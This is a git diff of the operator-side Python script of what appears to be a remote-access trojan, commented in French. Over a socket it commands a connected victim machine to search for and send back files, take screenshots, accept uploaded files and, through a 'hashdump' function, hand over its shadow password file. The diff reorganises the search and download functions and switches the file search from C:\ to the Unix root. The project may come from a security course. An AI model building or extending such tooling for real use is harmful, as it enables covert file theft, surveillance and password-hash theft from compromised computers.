@@ -2,23 +2,74 @@ from fileinput import filename
 import socket
 import ssl
 import os
+import subprocess
 from dotenv import load_dotenv
 
 SERVER_PORT = 8888
 
 # Fonction permettant de récupérer la liste des commandes disponibles
 def menu_help(client_socket):
+
     client_socket.send(b'help')  # Envoie de la commande
     menu_help_received = client_socket.recv(4096).decode()  # Réception du menu d'aides
     print(f'{menu_help_received}')# Affichage du menu d'aides
 
+# Fonction permettant de chercher un fichier sur la machine du client
+def search(client_socket) :
+    while True:
+        recherche_to_send = input("[?] Entrez le nom du fichier recherché : ") # Récupération du nom du fichier recherché
+        if recherche_to_send.strip() == "":
+            print("[!] Le nom du fichier ne peut pas être vide.")
+        else:
+            break
+    client_socket.send(b'search') # Envoie de la commande
+    client_socket.send(recherche_to_send.encode()) # Envoie du nom du fichier à rechercher
+    recherche_received = client_socket.recv(4096).decode() # Récupération des résultats de la recherche
+    print(f'\n{recherche_received}\n') # Affichage des résultats de la recherche
+
 # Fonction permettant de télécharger un fichier du client
 def download(client_socket):
-    client_socket.send(b'download')  # Envoie de la commande
+        filename = input("[?] Quel est le fichier que vous rechercher : ")
+        while True:
+            if filename.strip() == "":
+                print("[!] Le nom du fichier ne peut être vide.")
+            else:
+                break
+        client_socket.send(b'download')
+        client_socket.send(filename.encode())
+    
+        results_filename = client_socket.recv(4096).decode()
+        if results_filename == "no results":
+            print("Aucun résultat trouvé.")
+        else:
+            print("Resultats trouvés :")
+            print(results_filename)
 
+
+"""    try:    
+            ssl_socket.send(f'filename'.encode())
+            server_response = ssl_socket.recv(1024).decode()
+            if server_response == 'File not found':
+                print(f"Le fichier {filename} n'a pas été trouvé")
+            return
+        
+        with open(f'received_{filename}', 'wb') as file:
+            while True:
+                bytes_read = ssl_socket.recv(4096)
+                if not bytes_read:
+                    break
+                file.write(bytes_read)
+
+        print(f"Le fichier {filename} a été téléchargé avec succès.")
+    except Exception as e:
+        print(f"Erreur lors du téléchargement du fichier {filename} : {str(e)}")        
+    
+    #    except:
+    #            breakpoint
+"""
 # Fonction permettant de charger un fichier du serveur vers le client
-def upload(ssl_socket):
-    ssl_socket.send(b'upload') #Envoi de la commande upload
+def upload(client_socket):
+    client_socket.send(b'upload') #Envoi de la commande upload
     while True:
         filename = input("[?] Entrez le nom du fichier à envoyer : ") # Récupération saisie du nom du fichier
         if filename.strip() == "": # Check si l'input est vide
@@ -27,8 +78,8 @@ def upload(ssl_socket):
             break
         
     results = []
-    disk_root = "C:\\"
-    
+    disk_root = "/"
+        
     for root, dirs, files in os.walk(disk_root): # Recherche du fichier à la racine
         if filename in files:
             results.append(os.path.join(root, filename))
@@ -49,13 +100,13 @@ def upload(ssl_socket):
                 print(f"Entrée invalide. Veuillez saisir un numéro valide.")
                     
         try:
-            ssl_socket.send(filename.encode()) #Envoi du nom du fichier
+            client_socket.send(filename.encode()) #Envoi du nom du fichier
             with open(filepath, 'rb') as f: # Ouverture/lecture du fichier
                 while True:
                     chunk = f.read(4096)
                     if not chunk : 
                         break
-                    ssl_socket.sendall(chunk) # Envoi du fichier     
+                    client_socket.sendall(chunk) # Envoi du fichier     
         except Exception as e:
             print(f"Erreur lors de l'envoi du fichier {filename} : {str(e)}")
     else:
@@ -98,19 +149,6 @@ def screenshot(client_socket, nb_screenshot):
             screenshot.write(screenshot_received)  # Ecriture des données reçues dans le fichier ouvert
     print(f'[+] {screenshot_name} reçu')
     return nb_screenshot + 1  # Incrémentation du nombre de capture d'écran
-
-# Fonction permettant de chercher un fichier sur la machine du client
-def search(client_socket) :
-    while True:
-        recherche_to_send = input("[?] Entrez le nom du fichier recherché : ") # Récupération du nom du fichier recherché
-        if recherche_to_send.strip() == "":
-            print("[!] Le nom du fichier ne peut pas être vide.")
-        else:
-            break
-    client_socket.send(b'search') # Envoie de la commande
-    client_socket.send(recherche_to_send.encode()) # Envoie du nom du fichier à rechercher
-    recherche_received = client_socket.recv(4096).decode() # Récupération des résultats de la recherche
-    print(f'\n{recherche_received}\n') # Affichage des résultats de la recherche
 
 # Fonction permettant de récupérer le fichier shadow du client
 def hashdump(client_socket):
@@ -173,3 +211,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+#for racine, dirs, dossiers in os.walk("/"): # Parcours du système de fichiers
